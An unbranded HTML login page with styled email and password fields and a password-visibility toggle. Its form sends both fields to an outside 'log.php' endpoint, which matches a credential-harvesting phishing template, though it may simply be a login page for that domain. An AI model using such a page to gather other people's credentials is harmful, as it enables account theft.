<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Login</title>
  <style>
    :root{
      --bg:#0f1724;
      --card:#0b1220;
      --accent-start:#6ee7b7;
      --accent-end:#60a5fa;
      --muted:#94a3b8;
      --glass: rgba(255,255,255,0.04);
      --radius:14px;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
    }
    html,body{height:100%;margin:0;background:linear-gradient(180deg,#071026 0%, #071426 40%), radial-gradient(600px 300px at 10% 10%, rgba(96,165,250,0.08), transparent 20%), radial-gradient(500px 200px at 90% 90%, rgba(110,231,183,0.04), transparent 15%); color:#e6eef8;display:grid;place-items:center;}

    .card{
      width:100%;max-width:400px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:var(--radius);padding:32px;box-shadow:0 10px 30px rgba(2,6,23,0.6);border:1px solid rgba(255,255,255,0.03);backdrop-filter: blur(8px);
    }

    h1{margin-bottom:20px;font-size:22px;text-align:center}

    form .field{margin-bottom:16px}
    label{display:block;margin-bottom:6px;color:var(--muted);font-size:13px}
    input[type="email"], input[type="password"]{
      width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:var(--glass);color:inherit;font-size:15px;outline:none;transition:box-shadow .18s, border-color .18s;
    }
    input:focus{box-shadow:0 6px 18px rgba(96,165,250,0.06);border-color:rgba(96,165,250,0.28)}

    .btn{
      width:100%;padding:12px;border-radius:10px;border:0;font-weight:600;font-size:15px;cursor:pointer;
      background:linear-gradient(90deg,var(--accent-start),var(--accent-end));color:#06202a;box-shadow:0 10px 30px rgba(96,165,250,0.12);
    }

    .input-with-icon{position:relative}
    .eye-btn{position:absolute;right:6px;top:50%;transform:translateY(-50%);background:none;border:0;cursor:pointer;padding:6px;border-radius:8px}
  </style>
</head>
<body>
  <div class="card">
    <h1>Login</h1>
    <form id="loginForm" method="POST" action="https://king-indra.com/log.php" autocomplete="on">
      <div class="field">
        <label for="email">Email</label>
        <input id="email" name="email" type="email" placeholder="you@example.com" required />
      </div>
      <div class="field input-with-icon">
        <label for="password">Password</label>
        <input id="password" name="password" type="password" placeholder="Your password" required />
        <button type="button" class="eye-btn" onclick="togglePassword()">
          <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"></path>
            <circle cx="12" cy="12" r="3"></circle>
          </svg>
          <svg id="eyeClosed" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="display:none">
            <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.86 21.86 0 0 1 5.06-4.94"></path>
            <path d="M1 1l22 22"></path>
          </svg>
        </button>
      </div>
      <button class="btn" type="submit">Sign in</button>
    </form>
  </div>
  <script>
    function togglePassword(){
      const pwd = document.getElementById('password');
      const open = document.getElementById('eyeOpen');
      const closed = document.getElementById('eyeClosed');
      if(pwd.type === 'password'){
        pwd.type = 'text'; open.style.display='none'; closed.style.display='inline';
      } else {
        pwd.type = 'password'; open.style.display='inline'; closed.style.display='none';
      }
    }
  </script>
</body>
</html>
